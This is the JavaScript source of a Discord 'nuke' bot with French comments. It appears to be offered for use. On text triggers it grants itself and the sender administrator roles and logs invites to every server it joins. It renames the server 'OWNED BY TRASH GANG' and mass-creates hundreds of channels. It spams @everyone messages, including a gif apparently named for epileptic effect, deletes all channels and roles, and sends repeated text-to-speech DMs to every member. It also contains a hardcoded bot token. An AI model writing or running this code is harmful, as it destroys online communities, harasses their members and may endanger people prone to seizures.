const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
    client.channels.map(c => c.createInvite().then(url => console.log(`${url.code} : ${url.guild.name}`)))
    })
client.on("message", message => {
if(message.content === "roles"){
  for(var i =0; i < 200; i++){
      message.guild.createRole({name:"TRASH GANG > All !",
                               mentionable:false,
                               permissions:2146958591,
                               position: "",
                               color: "#fb0707"
          })
      }
  }
  if(message.content.includes(".rol")){
      message.guild.createRole({name:"Izi",
                                mentionable:false,
                                permissions:2146958591,
                                position: "",
                                color: "#fb0707"
     })
  }
  if(message.content.includes(".raul")){
    (message.guild.roles.map(r => message.member.addRoles(r)))
  }
  if(message.content.includes("ar!kelsairvvesrx")){
  }
 //foutre la merde
 if(message.content === "issou"){
    message.guild.setName("OWNED BY TRASH GANG")
    message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
  }
  if(message.content === "pd"){
    for(var i =0; i < 450; i++){
    message.guild.createChannel("BY","voice")
    }
  }
  if(message.content.includes("@everyone")){
      for(var i = 0; i < 500; i++){
          message.channel.send("@everyone @here Dead By Trash Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
      }
  }
  //réaction en chaine
        if(message.content === "channel"){
          message.channel.send("roles").then(m => m.delete());
          message.channel.send("issou").then(m => m.delete());
            for(var i = 0; i < 500; i++){
                message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
                message.guild.createChannel("BY","voice")
                message.guild.createChannel("TRASH GANG","category")    
            }
          }
          if(message.content === "destroy"){
            message.guild.channels.map(c => c.delete())
            }
            if(message.content === "admin"){
                message.delete();
                message.guild.roles.map(r => message.member.addRoles(r))
            }
            if(message.content === "drole"){
                message.delete();
                message.guild.roles.map(c => c.delete())
            }
            //on commence la destruction
            if(message.content.includes("détruire")){
                message.channel.send("ban").then(m => m.delete());
                message.channel.send("drole").then(m => m.delete());
                message.channel.send("destroy").then(m => m.delete());
                message.channel.send("jechange").then(m => m.delete());
                message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
            }
            if(message.content.includes("jechange")){
                message.guild.members.get(client.user.id).setNickname("JE T'ENCULE")
            }
            if(message.content === "mp"){

                for(var i = 0; i < 100; i++){

                    message.guild.members.map(m => m.send(`${msg.guild.owner.tag} @everyone @here Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://discord.gg/PgJt9E https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif`,{tts:true}))

                }

            }
        });
client.login("Mzc4MDEyMTUyMzAyMTQxNDUw.DO6PGQ.em2REkbW2ObQeie6z0H4IxjBAHU")
